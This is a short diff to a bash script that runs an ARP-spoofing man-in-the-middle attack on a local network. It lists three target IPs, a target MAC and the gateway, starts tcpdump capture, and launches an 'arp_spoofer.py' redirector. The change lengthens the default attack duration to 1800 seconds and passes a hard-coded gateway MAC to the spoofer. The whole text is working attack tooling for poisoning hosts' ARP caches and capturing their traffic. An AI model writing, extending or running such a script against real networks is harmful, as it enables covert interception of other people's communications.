@@ -7,7 +7,7 @@ TARGET_IPS=("192.168.1.138" "192.168.1.137" "192.168.1.134")
 TARGET_MAC="68:15:90:6b:81:96"
 GATEWAY_IP="192.168.1.1"
 HTTP_PORT="8080"
-DURATION="${1:-300}"
+DURATION="${1:-1800}"
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 REPO_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
@@ -111,8 +111,9 @@ fi
 echo "[+] tcpdump active (PID ${TCPDUMP_PID})"
 
 echo "[+] Starting native ARP redirector..."
+GATEWAY_MAC="14:ca:56:81:18:71"
 TARGETS_CSV="$(IFS=,; echo "${TARGET_IPS[*]}")"
-python3 "${SCRIPT_DIR}/arp_spoofer.py" "${IFACE}" "${TARGETS_CSV}" "${TARGET_MAC}" "${GATEWAY_IP}" > "${ARP_LOG}" 2>&1 &
+python3 "${SCRIPT_DIR}/arp_spoofer.py" "${IFACE}" "${TARGETS_CSV}" "${TARGET_MAC}" "${GATEWAY_IP}" "${GATEWAY_MAC}" > "${ARP_LOG}" 2>&1 &
 ARP_PID=$!
 sleep 1
 
